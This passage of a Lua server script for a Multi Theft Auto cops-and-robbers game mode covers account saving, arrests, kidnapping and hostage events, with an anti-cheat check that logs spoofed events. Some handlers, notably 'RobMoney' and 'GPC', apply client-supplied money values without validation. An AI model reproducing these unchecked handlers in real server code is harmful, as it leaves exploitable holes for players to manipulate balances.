	if src ~= resourceRoot then
		fake = true
		RHTNEDP(client,nm,"source")
	end
	if PLR ~= client then
		fake = true
		RHTNEDP(client,nm,"PLR")
	end
end

addEvent("TITH",true)
function FTITH(PLR,hpu,dim)
	if client then
		CICTC(eventName,source,PLR)
		if not fake then
			spc = getElementData(hpu,"HSPC")[1]
			setElementInterior(PLR,HNPI[spc][1])
			if dim then
				setElementDimension(PLR,dim)
			end
			triggerClientEvent(PLR,"DITM",PLR,HNPI[spc][2],HNPI[spc][3],HNPI[spc][4],HNPI[spc][5])
			setCameraTarget(PLR)
			spc = nil
		end
	end
end
addEventHandler("TITH",resourceRoot,FTITH)

addEvent("FTHT",true)
function FFTHT(PLR)
	if client then
		CICTC(eventName,source,PLR)
		if not fake then
			setElementInterior(PLR,0)
			setElementDimension(PLR,0)
		end
	end
end
addEventHandler("FTHT",resourceRoot,FFTHT)

addEvent("ENOR",true)
function FENOR(PLR,hpu,data)
	if client then
		CICTC(eventName,source,PLR)
		if not fake then
			hid = getElementID(hpu)
			nm = HNPI[HNA[tonumber(hid)][4]]
			if nm[7] and nm[7] ~= data then
				data = nm[7]
			end
			val = math.ceil(nm[6]*getElementData(bag,"Days") /419)
			if getElementData(PLR,data) < val then
				outputChatBox("You don't have enough money!",PLR,255,255,0)
			else
				spc = getElementData(hpu,"HSPC")
				nn = spc[3]+1
				if nn <= spc[2] and nn >= 0 and not xmlNodeGetAttribute(PXML,getAccountName(getPlayerAccount(PLR))) then
					setElementData(PLR,data,getElementData(PLR,data)-val)
					spc[3] = nn
					setElementData(hpu,"HSPC",spc)
					xmlNodeSetAttribute(PXML,getAccountName(getPlayerAccount(PLR)),hid)
					NORR = xmlFindChild(HXML,"h"..hid,0)
					if not NORR then
						NORR = xmlCreateChild(HXML,"h"..hid)
					end
					xmlNodeSetValue(NORR,nn)
					xmlNodeSetAttribute(NORR,getAccountName(getPlayerAccount(PLR)),1)
					xmlSaveFile(FXML)
					setElementData(PLR,"MCH",tonumber(hid))
					triggerClientEvent(PLR,"CHB",PLR,true)
				end
				hid,spc,nn = nil,nil,nil
			end
			data,val = nil,nil
	end
  end	
end
addEventHandler("ENOR",resourceRoot,FENOR)

function LCPH(PLR)
	if xmlNodeGetAttribute(PXML,getAccountName(getPlayerAccount(PLR))) then
		setElementData(PLR,"MCH",tonumber(xmlNodeGetAttribute(PXML,getAccountName(getPlayerAccount(PLR)))))
		triggerClientEvent(PLR,"CHB",PLR,true)
	end
end

function loadAccount(source,account)
	--outputDebugString("server: loadAccount") 
	
	SAC = GADJ(account,"SAC")
	if SAC then
		SAC = fromJSON(SAC)
		if SAC[1][1] then
			setElementData(source,"Stats",SAC[1][1])
		end
		if SAC[1][2] then
			setElementData(source,"WantLvl",SAC[1][2])
		end
		
		if SAC[1][7] then
			setElementData(source,"Job",SAC[1][7])
		end
		if SAC[1][8] then
			setElementData(source,"DLP",SAC[1][8])
		end
		if SAC[1][9] then
			setElementData(source,"SDG",SAC[1][9])
		end
		if SAC[1][10] then
			setElementData(source,"MDG",SAC[1][10])
		end
		if SAC[1][11] then
			setElementData(source,"EDG",SAC[1][11])
		end
		
		if SAC[1][12] then
			setElementData(source,"TBan",SAC[1][12])
		
		end
		setElementData(source,"Hits",SAC[1][13])
		if SAC[1][14] then
			setElementData(source,"KidH",SAC[1][14])
		end
		if SAC[1][15] and bag and getElementData(bag,SAC[1][15]) then
			local gAccJob = GADJ(getElementData(bag,SAC[1][15]),"SAC")
			if gAccJob then
				setElementData(source,"KidJ",fromJSON(gAccJob)[1][7])
			end 
		end
		if SAC[1][15] then
		     setElementData(source,"Kid",SAC[1][15])
		end
		--[[if SAC[2][10] then
			setElementData(source,"PGC",SAC[2][10])
		end]]
		if SAC[1][6] then
			setElementData(source,"PGC",SAC[1][6])
		end 
		PAC = fromJSON(GADJ(account,"PAC"))
		if PAC["P"][2][1] then
			setElementData(source,"PXP",PAC["P"][2][1])
		end
		arga = PAC["P"][2][2]
		if arga then
			if arga < 1 then
				arga = 1
			end
			setElementData(source,"PLVL",arga)
		end	
		
		if PAC["G"][2][1] then
			setElementData(source,"GXP",PAC["G"][2][1])
		end 
		arga = PAC["G"][2][2] 
		if arga then
			if arga < 1 then
				arga = 1
			end
			setElementData(source,"GLVL",arga )
		end					
		
	else
		SAC = {{0,0,0,0,0,0,0,0,0,0,0,0,false,0,false}}
		PAC = {["P"]={},["G"]={}}
		for k,v in pairs({"P","G"})do
			PAC[v][1] = {10000,1}
			PAC[v][2] = {0,1}
			PAC[v][3] = {0,1,1}
			PAC[v][4] = 100
			PAC[v][5] = {22,0,29,31,0,0,46,340,0,300,300,0,0,1,{0,0,0,666,0}}
		end
		PADJ(account,"SAC",toJSON(SAC))
		PADJ(account,"PAC",toJSON(PAC))
	end
	SAC,PAC = nil,nil
end

function saveAccount(source,argf,reason)
	--outputDebugString("server: saveAccount")
	account = getPlayerAccount(source)
	
	if account and getPlayerTeam(source) then
		SAC = fromJSON(GADJ(account,"SAC"))
		PAC = fromJSON(GADJ(account,"PAC"))
		
		SAC[1][1] = getElementData(source,"Stats")
		SAC[1][2] = getElementData(source,"WantLvl")
		SAC[1][3] = getElementData(source,"MBail")
		SAC[1][4] = getElementData(source,"Mins")
		SAC[1][5] = getElementData(source,"Secs")
		SAC[1][6] = getElementData(source,"PGC")

		SAC[1][7] = getElementData(source,"Job")
		SAC[1][8] = getElementData(source,"DLP")
		SAC[1][9] = getElementData(source,"SDG")
		SAC[1][10] = getElementData(source,"MDG")
		SAC[1][11] = getElementData(source,"EDG")
		SAC[1][12] = getElementData(source,"TBan")
		SAC[1][13] = getElementData(source,"Hits")
		SAC[1][14] = getElementData(source,"KidH")
		SAC[1][15] = getElementData(source,"Kid")
		

		if getPlayerTeam(source) == Police then
			arga = "P"
			argb = "PXP"
			argc = "PLVL"
		else
			arga = "G"
			argb = "GXP"
			argc = "GLVL"
		end

		PAC[arga][2][1] = getElementData(source,argb)
		PAC[arga][2][2] = getElementData(source,argc)
		PAC[arga][3][1] = getElementData(source,"GLA")
		PAC[arga][3][2] = getElementData(source,"GLType")
		PAC[arga][3][3] = getElementData(source,"GType")
		PAC[arga][4] = getPedArmor(source)
		
		if getElementData(source,"Alive") then
			argd = {
			getPedWeapon(source,2),
			getPedWeapon(source,3),
			getPedWeapon(source,4),
			getPedWeapon(source,5),
			getPedWeapon(source,6),
			getPedWeapon(source,8),
			getPedWeapon(source,11),
			getPedTotalAmmo(source,2),
			getPedTotalAmmo(source,3),
			getPedTotalAmmo(source,4),
			getPedTotalAmmo(source,5),
			getPedTotalAmmo(source,6),
			getPedTotalAmmo(source,8),
			getPedTotalAmmo(source,11)
			}
		else
			argd = getElementData(source,"MWPS")
		end
		if argd then
			local arge = {}
			if argd[1] > 0 then 
				arge[1] = getPedStat(source,WSkill[argd[1]]) 
			else
				arge[1] = 0
			end
			if argd[2] > 0 then 
				arge[2] = getPedStat(source,WSkill[argd[2]])
			else
				arge[2] = 0
			end
			if argd[3] > 0 then 
				arge[3] = getPedStat(source,WSkill[argd[3]]) 
			else
				arge[3] = 0
			end
			if argd[4] > 0 then 
				arge[4] = getPedStat(source,WSkill[argd[4]]) 
			else
				arge[4] = 666
			end
			if argd[5] > 0 then 
				arge[5] = getPedStat(source,WSkill[argd[5]]) 
			else
				arge[5] = 0
			end
			if NewWeapon then
			PAC[arga][5] = {argd[1],argd[2],argd[3],argd[4],argd[5],argd[6],argd[7],
			argd[8],argd[9],argd[10],argd[11],argd[12],argd[13],argd[14],arge}
			else
			local wbs = PAC[arga][5][15]
			PAC[arga][5] = {argd[1],argd[2],argd[3],argd[4],argd[5],argd[6],argd[7],
			argd[8],argd[9],argd[10],argd[11],argd[12],argd[13],argd[14],wbs}
			end
		end

		if SAC[1][1] == 2 then
			SAC[1][1] = 3
			SAC[1][2] = 0
		elseif SAC[1][2] > 2 and not SAC[1][15] and not argf then
			ax, ay, az = getElementPosition(source)
			for _, players in pairs(getPlayersInTeam(Police)) do
				cx, cy, cz = getElementPosition(players)
				dist = getDistanceBetweenPoints3D(ax, ay, az, cx, cy, cz)
				if dist < 60 then
					setElementData(players,"Money",getElementData(players,"Money")+(SAC[1][2]*200))
					if SAC[1][2] ~= 0 then
						SAC[1][1] = 3
						SAC[1][2] = 0
						if not reason then
						elseif reason ~= "Kicked" and reason ~= "Banned" then
							SAC[1][3] = 10000
							SAC[1][4] = 7
							SAC[1][5] = 59
							setAccountData(account,"ARecounctBug",true)
						end
					end
				end
			end
		elseif SAC[1][1] < 2 then
			SAC[1][1] = 0
		end
		PADJ(account,"SAC",toJSON(SAC))
		PADJ(account,"PAC",toJSON(PAC))
		SAC,PAC = nil,nil 
	end
end

addEvent("LSA",true)
addEventHandler("LSA",resourceRoot,function(PLR)
	if client then
		CICTC(eventName,source,PLR)
		if not fake then
			saveAccount(PLR,true)
		end
	end
end)

function RHTNEDP(PLR,nm,data,dtype)
  if isElement(PLR) and getElementType(PLR) == "player" then
	FDXML = xmlLoadFile("FD.xml")
	if not FDXML then
		FDXML = xmlCreateFile("FD.xml","root")
	end
	arga = xmlFindChild(FDXML,getAccountName(getPlayerAccount(PLR)).."_"..getPlayerSerial(PLR),0)
	if not arga then
		arga = xmlCreateChild(FDXML,getAccountName(getPlayerAccount(PLR)).."_"..getPlayerSerial(PLR))
	end
	argb = xmlFindChild(arga,"Accounts",0)
	if not argb then
		argb = xmlCreateChild(arga,"Accounts")
	end
	for k,v in pairs(getAccountsBySerial(getPlayerSerial(PLR))) do
		if not xmlNodeGetAttribute(argb,getAccountName(v)) then
			xmlNodeSetAttribute(argb,getAccountName(v),1)
		end
	end
	argc = xmlFindChild(arga,"Names",0)
	if not argc then
		argc = xmlCreateChild(arga,"Names")
	end
	if not xmlNodeGetAttribute(argc,getPlayerName(PLR)) then
		xmlNodeSetAttribute(argc,getPlayerName(PLR),1)
	end
	if dtype then
		argf = "elementData"
	else
		argf = "trigger"
	end
	argd = xmlFindChild(arga,argf,0)
	if not argd then
		argd = xmlCreateChild(arga,argf)
	end
	if tonumber(xmlNodeGetAttribute(argd,nm.."("..data..")")) then
		arge = tonumber(xmlNodeGetAttribute(argd,nm.."("..data..")"))+1
	else
		arge = 1
	end
	xmlNodeSetAttribute(argd,nm.."("..data..")",arge)
	xmlSaveFile(FDXML)
	xmlUnloadFile(FDXML)
	else
	        if dtype then
		           argf = "elementData"
	        else
		           argf = "trigger"
	        end	
	end
	for k,v in pairs(getElementsByType("player")) do
		if isObjectInACLGroup("user."..getAccountName(getPlayerAccount(v)),aclGetGroup("Console")) then
			outputChatBox("!!!_______________"..argf.."("..nm..")_______________!!!",v,255,0,0)
			if isElement(PLR) and getElementType(PLR) == "player" then
				local data = data or "---"
				outputChatBox(getPlayerName(PLR).." is trying to send fake data("..data..")",v,255,0,0)
			end
		end
	end
end

addEvent("MDC", true)
function medi(PLR,mtx, mty, mtz, mtr, model, team,team2)
	--outputDebugString("server: medic")
	if client then
		CICTC(eventName,source,PLR)
		if not fake then 
			spawnPlayer(PLR, mtx, mty, mtz, mtr, model, 0, 0, team)
			exports["guimessages"]:outputServer(PLR, "You Are Medic | Heal other players to earn Money!", 0, 255, 255)
			exports["guimessages"]:outputServer(PLR, "You can create medic marker by command /medic.", 255, 50, 150) 
			--giveWeapon(PLR,46,0)
			for i = 1, 5 do
				giveWeapon(PLR, 41, 9999, true)
			end
			setTimer(setCameraTarget, 50, 1, PLR)
		end
	end
end
addEventHandler("MDC", resourceRoot, medi) 
	
addEvent("NOT", true)
function noTeam(PLR,ntx, nty, ntz, ntr, model, team,team2)--(ntx, nty, ntz, ntr, model, team,selecting)
	if client then
		CICTC(eventName,source,PLR)
		if not fake then
			spawnPlayer(PLR, ntx, nty, ntz, ntr, model, 0, 0, team)  
			obj = nil
		end
	end
end
addEventHandler("NOT", resourceRoot, noTeam)

  
addEvent("RobMoney", true)
function RobMoney(PLR,robbed,robM,rlmtext,rlmtext2)
	if PLR and robM then
        setElementData(PLR, "Money", getElementData(PLR, "Money")-robM)
        exports["guimessages"]:outputServer(PLR, rlmtext, 255, 0, 0)
        setElementData(PLR, "Rob", nil) 
        setElementData(robbed, "Money", getElementData(robbed, "Money")+robM)
        setElementData(robbed, "protect", nil)
        exports["guimessages"]:outputServer(robbed, rlmtext2, 255, 0, 0)
			 
    end	
end
addEventHandler("RobMoney", resourceRoot, RobMoney)

addEvent("DSPPE",true)
function FDSPPE(PLR,data)
	if client then
		CICTC(eventName,source,PLR)
	else
		fake = nil
	end
	if not fake then
		arga = getElementData(PLR,data)
		if arga then
			if isElement(arga) and getElementData(arga,"Stinger") then--getElementType(arga) == "colshape" and
				destroyElement(getElementData(arga,"Stinger"))
				removeElementData(arga,"Stinger")
			end
			if isElement(arga) then
			   destroyElement(arga)
			end
			removeElementData(PLR,data)
		end
	end
end
addEventHandler("DSPPE",resourceRoot,FDSPPE)

gbm = {}

---------------------------------------------------------------

addEvent("anim", true)
function ani(PLR)
	--outputDebugString("server: ani")
	if client then
		CICTC(eventName,source,PLR)
	else
		fake = nil
	end
	if not fake then
		--triggerClientEvent("Canim", root, PLR)
		setPedAnimationN(PLR, "SWORD", "sword_block", 1, false, false)
		setTimer(function(PLR) if isElement(PLR) then setPedAnimationProgress(PLR,"sword_block",1) end end,50,1,PLR)
	end
end
addEventHandler("anim", resourceRoot, ani)

addEvent("anim2", true)
function ani2(PLR)
	--outputDebugString("server: ani2")
	if client then
		CICTC(eventName,source,PLR)
		if not fake then
			--triggerClientEvent("Canim2", root, PLR)
			setPedAnimation(PLR, "ped", "cower", 1, false, false)
		end
	end
end
addEventHandler("anim2", resourceRoot, ani2)

BlipKnh = {}

			function DestoryBlipKnh(p)
			if isElement (BlipKnh[p]) then
			 destroyElement (BlipKnh[p] )
			end
			end

addEvent("arresting",true)
function ARRESTSTYLE(PLR,suspect,cop)
	--outputDebugString("server: ARRESTSTYLE")
	if client then
		CICTC(eventName,source,PLR)
	else
		fake = nil
	end
	if not fake then
		if isElement (suspect) and not getElementData(suspect, "InMission") then
			if getElementData(cop,"Job") == 3 and getPedWeapon(suspect) < 18 or getPlayerTeam(cop) == Police then
				if getElementData(suspect, "Stats") and getElementData(suspect, "Stats") < 2 and getElementData(cop, "Stats") < 2 and getElementHealth(suspect) > 0 and getElementHealth(cop) > 0 then
					setElementData(cop,"Prisoners",1)
					local ARS,vTT = math.random(1,2),{}
					if getPlayerTeam(cop) == Police then
						x,y,z = getElementPosition(suspect)
						OPE[tostring(getElementData(cop,"ID"))]["ARAssist"] = {}
						table.insert(OPE[tostring(getElementData(cop,"ID"))]["ARAssist"],cop)
						for k,v in pairs(getPlayersInTeam(Police)) do
							if v ~= cop and not OPE[tostring(getElementData(cop,"ID"))]["ARAssist"][v] then
								xx,yy,zz = getElementPosition(v)
								dist = getDistanceBetweenPoints3D(x,y,z,xx,yy,zz)
								if dist < 20 then
									if isPedInVehicle(v) then
										for _,i in pairs(getVehicleOccupants(getPedOccupiedVehicle(v))) do
											table.insert(OPE[tostring(getElementData(cop,"ID"))]["ARAssist"],i)
										end
									else
										table.insert(OPE[tostring(getElementData(cop,"ID"))]["ARAssist"],v)
									end
								end
							end
						end
						if rbp == suspect then
							x, y, z = getElementPosition(suspect)
							z = z-1
							FDBFR(x, y, z)
						end
						vTT[suspect] = tlng[plng[suspect]][1]..''..getPlayerName(cop)..''..tlng[plng[suspect]][2]
						exports["guimessages"]:outputServer(suspect, vTT[suspect], 255, 0, 0)
						notification(suspect, 'r', 'hc', 'r', vTT)
						vTT = {}
						vTT[cop] = tlng[plng[cop]][3]..''..getPlayerName(suspect)..''..tlng[plng[cop]][4]
						exports["guimessages"]:outputServer(cop, vTT[cop], 0, 0, 255)
						notification(cop, 'g', 'hc', 'g', vTT)
						toggleControl(suspect, "fire", false)
						toggleControl(suspect, "jump", false)
						toggleControl(suspect, "next_weapon", false)
						toggleControl(suspect, "previous_weapon", false)
						setElementData(suspect, "Stats", 2)
						triggerClientEvent(cop,"UTWPTJ",cop)
						setPedFightingStyle(suspect, 16)
						--setPedAnimationN(cop, "ped", "ARRESTgun", false, false)
						if ARS == 1 then
							setPedAnimationN(suspect, "ROB_BANK", "SHP_HandsUp_Scr", 1, false)
							setTimer(ani, 1000, 1, suspect)
							setTimer(setPedAnimationN, 1000, 1, cop, "GANGS", "DRUGS_BUY", false, false)
							setTimer(setPedAnimationN, 2000, 1, cop)
						else
							setPedAnimationN(suspect, "SHOP", "SHP_Rob_React", 1, false)
							setTimer(ani, 3000, 1, suspect)
							setTimer(setPedAnimationN, 1000, 1, cop, "GANGS", "DRUGS_BUY", false, false)
							setTimer(setPedAnimationN, 2000, 1, cop)
						end
					else
						if rbp == suspect then
							FDBFR()
						end
						vTT[suspect] = tlng[plng[suspect]][43]..' '..getPlayerName(cop)
						exports["guimessages"]:outputServer(suspect, vTT[suspect], 255, 0, 0)
						notification(suspect, 'r', 'kd', 'r', vTT)
						vTT = {}
						vTT[cop] = tlng[plng[cop]][44]..' '..getPlayerName(suspect)
						exports["guimessages"]:outputServer(cop, vTT[cop], 255, 125, 0)
						notification(cop, 'g', 'kd', 'g', vTT)
						setElementData(suspect, "Stats", 4)
						BlipKnh[suspect] = createBlipAttachedTo(suspect,0,4,0,0,0,255)

						setElementFrozen(suspect,false)
						if getElementData(cop, "WantLvl") < 3 then
							if getPlayerTeam(suspect) == Police then
								setElementData(cop, "WantLvl", 4)
							else
								setElementData(cop, "WantLvl", 3)
							end
						end 
						setElementData(bag, getPlayerName(cop), getPlayerAccount(cop))
						setElementData(suspect, "KidH", math.random(1, 3))
						setElementData(suspect, "Kid", getPlayerName(cop))
						setPedAnimationN(cop, "SHOP", "ROB_Loop_Threat", false, false)
						if ARS == 1 then
							setPedAnimationN(suspect, "ROB_BANK", "SHP_HandsUp_Scr", false, false)
							setTimer(setPedAnimationN, 2000, 1, cop)
							setTimer(setPedAnimationN, 2000, 1, suspect)
						else
							setPedAnimationN(suspect, "SHOP", "SHP_Rob_React", false, false)
							setTimer(setPedAnimationN, 3000, 1, cop)
							setTimer(setPedAnimationN, 3000, 1, suspect)
						end
						triggerClientEvent(cop,"DKH",cop)
					end
					--local vT = {suspect,cop}
					triggerClientEvent({suspect,cop},"clienAR",resourceRoot,suspect,cop,ARS)
				end
			end
		end
	end
end
addEventHandler("arresting",resourceRoot,ARRESTSTYLE)

addEvent("warp", true)
function wptv(PLR, cop)
	--outputDebugString("server: wptv")
	if client then
		CICTC(eventName,source,PLR)
		if not fake then
		    if not isElement (cop) then return end
			veh = getPedOccupiedVehicle(cop)
			if veh then
			   model = getElementModel(veh)
			else
			   return
			end
  			if not getVehicleOccupant(veh, 2) then
				warpPedIntoVehicle(PLR, veh, 2)
			elseif not getVehicleOccupant(veh, 3) then
				warpPedIntoVehicle(PLR, veh, 3)
			end
			if not isPedInVehicle(PLR) then
				if not getVehicleOccupant(veh, 1) then
					warpPedIntoVehicle(PLR, veh, 1)
					setPedAnimationN(PLR, "SWORD", "sword_block", 0, false, false, true, false)
					setTimer(setPedAnimationProgress,50,1,PLR,"sword_block",1)
				end
			else
				setPedAnimationN(PLR, "SWORD", "sword_block", 0, false, false, true, false)
				setTimer(setPedAnimationProgress,50,1,PLR,"sword_block",1)
			end
		end
	end
end
addEventHandler("warp", resourceRoot, wptv)

addEvent("unwarp", true)
function uwptv(PLR)
	--outputDebugString("server: uwptv")
	if client then
		CICTC(eventName,source,PLR)
		if not fake then
			removePedFromVehicle(PLR)
			setPedAnimationN(PLR, "SWORD", "sword_block", 0, false, false, true, false)
			setTimer(setPedAnimationProgress,50,1,PLR,"sword_block",1)
		end
	end
end
addEventHandler("unwarp", resourceRoot, uwptv)

addEvent("WANTED", true)
function wantedlevel(PLR,suspect,WANLEV)
	--outputDebugString("server: wantedlevel")
	if client then
		CICTC(eventName,source,PLR)
		if not fake then
			setElementData(suspect, "WantLvl", WANLEV)
		end
	end
end
addEventHandler("WANTED", resourceRoot, wantedlevel)

addEvent("GPC", true)
function FGPC(PLR,seller,cash,amount,Wlvl)
	if client then
		CICTC(eventName,source,PLR)
		if not fake then
			if seller and isElement(seller) and cash and cash then
				setElementData(seller, "Money", getElementData(seller, "Money")+cash) 
				setElementData(seller, "DLP", getElementData(seller, "DLP")-amount)
				removeElementData(seller,"DL")--setElementData(seller, "DL",false)
				exports["guimessages"]:outputServer(seller, tlng[plng[seller]][30]..''..cash, 0, 255, 0)
				if Wlvl then
					setElementData(seller, "WantLvl", Wlvl)
				end
			end
		end
	end
end
addEventHandler("GPC", getRootElement(), FGPC)

addEvent("Cust", true)
function FCust(PLR,seller,val)
	if client then
		CICTC(eventName,source,PLR)
		if not fake then
			if seller and isElement(seller) then
				setElementData(seller,"DL",val)
			end	
		end
	end
end
addEventHandler("Cust", getRootElement(), FCust)




addEvent("escaped", true)
function NOTUAR(PLR,suspect, cop, block, anim,arga)
	--outputDebugString("server: NOTUAR")
	if client then
		CICTC(eventName,source,PLR)
		if not fake then
			if cop then
				if getPlayerTeam(cop) == Police then
					if arga and OPE[tostring(getElementData(cop,"ID"))]["ARAssist"][1] then
						local vT,vTT = {},{}
						for k,v in pairs(OPE[tostring(getElementData(cop,"ID"))]["ARAssist"]) do
							if getPlayerTeam(v) == Police then
								if v == cop then
									vTT[v] = {"+20 Arrest"}
									arga = getElementData(v,"PXP")+20
								else
									vTT[v] = {"+10 Arrest Assist"}
									arga = getElementData(v,"PXP")+10
								end
								OPLU(v,"PXP","PLVL",arga)
								table.insert(vT,v)
							end
						end
						--OPLU(k,Karga,Kargb,arga)
						--local next = next
						if not table.empty(vT) then
							triggerClientEvent(vT,"OPEC",resourceRoot,vTT)
						end
						OPE[tostring(getElementData(cop,"ID"))]["ARAssist"] = {}
					end
					OPE[tostring(getElementData(cop,"ID"))]["ARAssist"] = {}
					triggerClientEvent(cop, "UTWPTJ", cop)
				end
				setElementData(cop, "Prisoners", 0)
				--setElementData(bag, getPlayerName(cop), false)
			end
			DestoryBlipKnh(suspect)
			if suspect then
				--block, anim = getPedAnimation(suspect)
				if block == "ped" and anim == "cower" then
					setPedAnimationN(suspect, "SWORD", "sword_block", 1, false, false)
					setTimer(setPedAnimationProgress,50,1,suspect,"sword_block",1)
				end
				if getElementData(suspect, "Stats") > 3 then
					setElementData(suspect, "Stats", 0)
					toggleControl(suspect, "jump", true)
				else
					setElementData(suspect, "Stats", -1)
				end
				setElementData(suspect, "KidH", 0)
				if getElementData(suspect,"Kid") and getElementData(bag,getElementData(suspect,"Kid")) then
					removeElementData(bag,getElementData(suspect,"Kid"))
				end
				removeElementData(suspect, "Kid")
			end
			if cop and suspect then
				local vTT = {}
				vTT[suspect] = tlng[plng[suspect]][5]..''..getPlayerName(cop)..''..tlng[plng[suspect]][6]
				exports["guimessages"]:outputServer (suspect, vTT[suspect], 255, 255, 0)
				notification(suspect, 'y', 'ehc', 'y', vTT)
				vTT = {}
				vTT[cop] = tlng[plng[cop]][7]..''..getPlayerName(suspect)..''..tlng[plng[cop]][8]
				exports["guimessages"]:outputServer (cop, vTT[cop], 255, 0, 0)
				notification(cop, 'r', 'ehc', 'r', vTT)
				if getPlayerTeam(cop) ~= Police then
					triggerClientEvent(cop,"CKD", cop, cop)
				end
			end
		end
	end
end
addEventHandler("escaped", resourceRoot, NOTUAR)

addEvent("Kidnapped", true)
function FKidnapped(hitp, cop, knh)
	if client then
		CICTC(eventName,source,hitp)
		if not fake then
			if cop then
				setElementData(cop, "Prisoners", 0)
				--setElementData(bag, getPlayerName(cop), getPlayerAccount(cop))
				--setElementData(hitp, "Kid", getPlayerName(cop))
				setElementData(hitp, "KidH", knh)
			end
			if isPedDead(hitp) then
				kickPlayer(hitp)
			elseif isPedInVehicle(hitp) then
				removePedFromVehicle(hitp) 
			end
			if not knh then knh = math.random(1,3) end
			setTimer(setPedAnimationN, 100, 1, hitp, "ped", "BIKE_fallR", 1, false)
			setTimer(setPedAnimationN, 1700, 1, hitp, "ped", "getup", 1, false)
			setTimer(setPedAnimationN, 3100, 1, hitp)
			--vT = {cop,hitp}
			triggerClientEvent({cop,hitp},"CKD", resourceRoot, cop, hitp)
				--
			local dd = getElementData(hitp,"Kid")
			if dd and isElement(getPlayerFromName(dd)) then
			    setPointMissionPlayer (getPlayerFromName(dd))
			end
			if knh == 3 then
											   setElementData(hitp, "KidH",knh)
											   fadeCamera ( hitp, false, 1, 0, 0, 0 )
											   setTimer ( function(player) 
											   fadeCamera(player, true, 1 )
											   SetElementInterior(player, 1)
											   SetElementPosition(player,244, 305, 998.7) 
											   end, 1000 , 1, hitp )
			elseif knh == 2 then
											   setElementData(hitp, "KidH",knh)
											   fadeCamera ( hitp, false, 1, 0, 0, 0 )
											   setTimer ( function(player) 
											   fadeCamera(player, true, 1 )
											   SetElementInterior(player, 6)
											   SetElementPosition(player, 344, 305, 998.7)
											   setPedRotation(player, 90) 
											   end, 1000 , 1, hitp )
			else
											   knh = 1 
											   setElementData(hitp, "KidH",knh)
											   fadeCamera ( hitp, false, 1, 0, 0, 0 )
											   setTimer ( function(player) 
											   fadeCamera(player, true, 1 )
											   SetElementInterior(player, 3)
											   SetElementPosition(player,293, 310, 998.7)
											   setPedRotation(player, 270)
											   end, 1000 , 1, hitp )
			end

			SetElementDimension(hitp, 5)
			DestoryBlipKnh(hitp)
		end
	end
end
addEventHandler("Kidnapped", resourceRoot, FKidnapped)

addEvent("WARNALLKD", true)
function FWARNALLKD(PLR)
	if client then
		CICTC(eventName,source,PLR)
		if not fake then
			for k,v in pairs(getPlayersInTeam(NoTeam)) do
				if getElementData(v, "Job") == 3 then
					exports["guimessages"]:outputServer(v, tlng[plng[v]][11], 255, 0, 0)
					exports["guimessages"]:outputServer(v, tlng[plng[v]][45], 255, 0, 0)
				end
			end
		end
	end
end
addEventHandler("WARNALLKD", resourceRoot, FWARNALLKD)

addEvent("freeH", true)
function FfreeH(resc, hostage, rch)
	if client then
		CICTC(eventName,source,resc)
		if not fake then
			--rew = 2000
			--triggerClientEvent("GPM", hostage, hostage, rew)
			--rew = -2000
			--triggerClientEvent("GPM", resc, resc, rew)
			if getPlayerTeam(resc) == Police then
				triggerClientEvent("ResqRew", resourceRoot, rch, hostage)
			else
				setElementData(resc, "Money", getElementData(resc, "Money")-CashFdia)
				--setElementData(resc, "Scores", getElementData(resc, "Scores")+2)
				givePlayerScore (resc,2)
			end
			setElementData(hostage, "Money", getElementData(hostage, "Money")+CashFdia)
			triggerClientEvent(hostage,"payR", hostage, hostage, resc)
		end
	end
end
addEventHandler("freeH", resourceRoot, FfreeH)

addEvent("freeK", true)
function FfreeK(PLR, cop, resc)
	if client then
		CICTC(eventName,source,PLR)
		if not fake then
			if resc then
				if getPlayerTeam(resc) == Police then
					exports["guimessages"]:outputServer(PLR, tlng[plng[PLR]][46], 0, 255, 0)
				else
					exports["guimessages"]:outputServer(PLR, getPlayerName(resc)..' '..tlng[plng[PLR]][47], 0, 255, 0)
				end
			end
			--rew = 2000
			triggerClientEvent(PLR, "freeP", PLR)
			if getElementData(PLR, "Stats") > 3 then
				setElementData(PLR, "Money", getElementData(PLR, "Money")-CashFdia)
			end
			if getElementData(PLR, "KidH") == 3 then
				SetElementPosition(PLR, 2150, -1587, 14.6)
				setPedRotation(PLR, 220)
			elseif getElementData(PLR, "KidH") == 2 then
				SetElementPosition(PLR, 887.5, -1115, 23.8)
				setPedRotation(PLR, 0)
			elseif getElementData(PLR, "KidH") == 1 then
				SetElementPosition(PLR, 1111.5, -974, 42.4)
				setPedRotation(PLR, 0)
			elseif getElementData(PLR, "KidH") == 4 then
				SetElementPosition(PLR, 1423,2338,11)
				setPedRotation(PLR, 0)
			elseif getElementData(PLR, "KidH") == 5 then
				SetElementPosition(PLR, 571, 1216, 11.8)
				setPedRotation(PLR, 0)
			elseif getElementData(PLR, "KidH") == 6 then
				SetElementPosition(PLR, -1665, 1368, 7.5)
				setPedRotation(PLR, 0)
			elseif getElementData(PLR, "KidH") == 7 then
				SetElementPosition(PLR, 1684, 689, 11)
				setPedRotation(PLR, 0)
			end
			SetElementDimension(PLR, 0)
			SetElementInterior(PLR, 0)
			--if cop then
			local pkid = getElementData(PLR,"Kid")
			if getElementData(PLR, "Stats") > 3 then
				if getPlayerFromName(pkid) then
					exports["guimessages"]:outputServer(getPlayerFromName(pkid), tlng[plng[getPlayerFromName(pkid)]][48], 0, 255, 0)
					givePlayerPoints(getPlayerFromName(pkid),"Hook",1) 
					--outputChatBox(efhtext[getPlayerFromName(pkid)], getPlayerFromName(pkid), 0, 255, 0)
					setElementData(getPlayerFromName(pkid), "Money", getElementData(getPlayerFromName(pkid), "Money")+CashFdia)
				elseif getElementData(bag,pkid) then
					local PAC = fromJSON(GADJ(getElementData(bag,pkid),"PAC"))
                    PAC["G"][1][1] = PAC["G"][1][1]+CashFdia
                    PADJ(getElementData(bag,pkid),"PAC",toJSON(PAC))
					--PAC = nil
				end
				setElementData(PLR, "Stats", 0)
			end
			--setElementData(bag, getElementData(PLR, "Kid"), false)
			setElementData(PLR, "KidH", 0)
			if pkid then
				removeElementData(bag,pkid)
			end
			removeElementData(PLR, "KidJ")
			removeElementData(PLR, "Kid")
			setElementData(PLR, "Stats", 0)
			setElementData(PLR, "protect", true)
		end
	end
end
addEventHandler("freeK", resourceRoot, FfreeK)

addEvent("REDAFS", true)
function FREDAFS(PLR)
	--outputDebugString("server: FREDAFS")
	if client then
		CICTC(eventName,source,PLR)
		if not fake then
			--setElementData(PLR, "Stats", 0)
			setPedFightingStyle(PLR, 15)
		end
	end
end
addEventHandler("REDAFS", resourceRoot, FREDAFS)

------------------------------------------------------------

--------------------------------------------------------------------------------------------------------

